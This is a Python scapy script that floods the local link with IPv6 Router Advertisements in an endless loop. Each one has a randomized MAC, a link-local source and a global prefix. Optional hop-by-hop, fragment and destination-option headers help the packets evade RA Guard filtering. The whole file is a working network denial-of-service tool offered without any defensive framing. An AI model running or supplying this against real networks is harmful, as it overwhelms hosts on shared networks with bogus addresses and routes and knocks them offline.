import argparse
import functools
import operator
import random
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('-H', '--do-hbh', action='store_true')
parser.add_argument('-F', '--do-frag', action='store_true')
parser.add_argument('-D', '--do-dst', action='store_true')
args = parser.parse_args()
iface = args.iface
do_hbh = args.do_hbh
do_frag = args.do_frag
do_dst = args.do_dst

if iface:
    sp.conf.iface = iface

ipexthdrs = []
if do_hbh:
    ipexthdrs.append(inet6.IPv6ExtHdrHopByHop())
if do_frag:
    ipexthdrs.append(inet6.IPv6ExtHdrFragment(id=random.getrandbits(32)))
if do_dst:
    ipexthdrs.append(inet6.IPv6ExtHdrDestOpt())
if ipexthdrs:
    ipexthdrs = functools.reduce(operator.truediv, ipexthdrs)
else:
    ipexthdrs = None


def randbytes():
    return hex(random.getrandbits(8))[2:]


def rand2bytes():
    return hex(random.getrandbits(16))[2:]


def randmac():
    return ':'.join(randbytes() for _ in range(6))


def randip():
    return 'fe80::' + ':'.join(rand2bytes() for _ in range(4))


def randprefix():
    return f'20{randbytes()}:{rand2bytes()}::'


while True:
    mac = randmac()
    ip = randip()
    prefix = randprefix()
    p = sp.Ether(src=mac, dst='33:33:00:00:00:01') / \
        inet6.IPv6(src=ip, dst='ff02::1')
    if ipexthdrs:
        p /= ipexthdrs
    p /= inet6.ICMPv6ND_RA(M=1, O=1) / \
        inet6.ICMPv6NDOptSrcLLAddr(lladdr=mac) / \
        inet6.ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=64)
    sp.sendp(p, verbose=0)
